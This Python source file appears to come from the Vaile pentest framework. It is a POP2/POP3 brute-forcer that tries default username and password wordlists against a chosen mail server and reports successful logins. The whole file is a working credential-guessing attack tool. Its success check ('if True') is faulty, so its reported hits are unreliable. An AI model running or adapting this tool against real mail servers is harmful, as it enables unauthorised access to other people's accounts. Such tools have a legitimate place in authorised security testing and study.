#!/usr/bin/env python3
#-*- coding: utf-8 -*-

#-:-:-:-:-:-:-:-:-:-:-:-:#
#    Vaile Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

#This module requires Vaile Framework
#https://github.com/VainlyStrain/Vaile


import poplib
import time
import socket
from core.Core.colors import *

popuser = []
poppass = []

searchinfo = "POP Bruteforcer"
info = "POP password cracker for common users using dictionaries."
properties = {}

def popbrute(web):

    print(R+'\n   ===================================')
    print(R+'    P O P 2/3   B R U T E F O R C E R')
    print(R+'   ===================================\n')
    try:
        print(GR+' [*] Testing target...')
        time.sleep(0.5)
        ip = socket.gethostbyname(web)

        m = input(O+' [#] Use IP '+R+str(ip)+O+'? (y/n) :> ')
        if m == 'y' or m == 'Y':
            pass
        elif m == 'n' or m == 'N':
            ip = input(O+' [#] Enter IP :> ')

        print(G+' [+] Target appears online...\n')
        print(O+' Choose the port number :\n')
        print(C+'   PORT     PROTOCOL')
        print(C+'   ====     ========')
        print(B+'   109        POP2')
        print(B+'   110        POP3')

        port = input(GR+'\n [#] Enter the port :> ')
        pop = poplib.POP3(ip,int(port))
        print(GR+' [*] Using default credentials...')
        time.sleep(0.6)
        print(O+' [!] Importing file paths...')
        time.sleep(0.8)
        try:
            with open('files/brute-db/pop/pop_defuser.lst','r') as users:
                for u in users:
                    u = u.strip('\n')
                    popuser.append(u)

            with open('files/brute-db/pop/pop_defpass.lst','r') as pas:
                for p in pas:
                    p = p.strip('\n')
                    poppass.append(p)
        except IOError:
            print(R+' [-] Importing wordlist failed!')

        for user in popuser:
            for password in poppass:
                try:
                    pop.user(str(user))
                    pop.pass_(password)
                    if True:
                        print(G+' [!] Successful login with ' +O+user+G+ ' and ' +O+password)
                        break
                except:
                    print(C+' [!] Checking '+B+user+C+' and '+B+password+'...')

    except:
        print(R+' [-] Target seems to be down!')

def attack(web):
    popbrute(web)